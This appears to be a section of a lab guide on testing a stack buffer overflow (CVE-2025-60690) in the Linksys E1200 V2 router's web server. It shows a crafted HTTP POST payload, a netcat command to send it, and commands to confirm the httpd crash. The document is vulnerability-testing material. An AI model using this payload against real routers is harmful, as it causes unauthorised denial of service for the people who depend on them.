# 3. Proof-of-Concept (PoC) testing

In this section, we will be observing the behavior of the stack-based buffer overflow vulnerability present on the Linksys E1200 V2 router.&#x20;

We will be working with the following CVE:

{% embed url="https://nvd.nist.gov/vuln/detail/CVE-2025-60690" %}

and the following PoC:

{% embed url="https://github.com/yifan20020708/SGTaint-0-day/blob/main/Linksys/Linksys-E1200/CVE-2025-60690.md" %}

The PoC is expected to invoke a denial of service on the router.&#x20;

Refer to the section "_Basic network services testing_" for more information:

### Payload

{% code title="payload.txt" %}
```http
POST /cgi-bin/get_merge_ipaddr HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded

param_0=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&param_1=BBBBBBBBBBBBBBBBBBBBBBBBBBBBB&param_2=CCCCCCCCCCCCCCCCCCCCCCCCCCCCC&param_3=DDDDDDDDDDDDDDDDDDDDDDDDDDDD
```
{% endcode %}

#### Send the payload

```shellscript
$ cat payload.txt | nc -v <router_ip> 80
```

#### Verify crash

We can use a few methods to verify the crash:

1. &#x20;UART console

* crash messages such as segmentation faults
* `httpd` process changes
  * PID changed
  * process killed

```shellscript
$ ps w | grep httpd
```

2. Test network services

```shellscript
$ ping <router_ip>
$ curl http://<device_ip>:80
$ nc -u -v <device_ip> 53
```

&#x20;...

3. Using `GDB` on the real-time process

```shellscript
$ ...
```
